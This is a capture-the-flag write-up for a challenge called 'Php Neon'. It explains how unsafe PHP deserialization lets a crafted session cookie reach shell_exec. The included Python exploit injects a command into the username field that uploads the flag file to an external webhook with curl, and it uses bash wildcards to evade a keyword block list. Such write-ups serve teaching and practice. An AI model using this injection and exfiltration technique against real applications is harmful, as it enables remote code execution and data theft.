# Php Neon

## Overview
The flag can be obtained through RCE (Remote Code Execution). It's possible to exploit deserialization to achieve RCE in the username via PHP `shell_exec` command. To do this, it's enough to serialize a User object and pass the bash command we want into the username, closing the previous string and commenting out the remaining apostrophe at the end. Once the object is serialized, we can convert it to base64 and use it as a session cookie. Since `shell_exec` executes code without displaying the output, it's necessary to use an external server such as ngrok or requestbin to send the flag. To make things even more complicated, the strings like `flag` or `curl` have been banned, but this can be easily bypassed using bash wildcards. For example, `/f*` will not be blocked e we can rewrite `curl` as `c?rl`, but execute it by referencing it from `/usr/bin/c?rl`.

## Exploit
```py
import subprocess
import requests

url = "http://127.0.0.1:6003"
webhook = input("webhook: ")

php_code = f"""
    <?php
    class User {{
        public $username;

        public function __construct($username) {{
            $this->username = $username;
        }}
    }}
    echo base64_encode(serialize(new User("'; /usr/bin/c?rl -T /f* {webhook} #")));
    ?>
"""

output = subprocess.check_output(["php"], input=php_code.encode())
cookies = output.decode().strip()

requests.get(url, cookies={"user": cookies})
```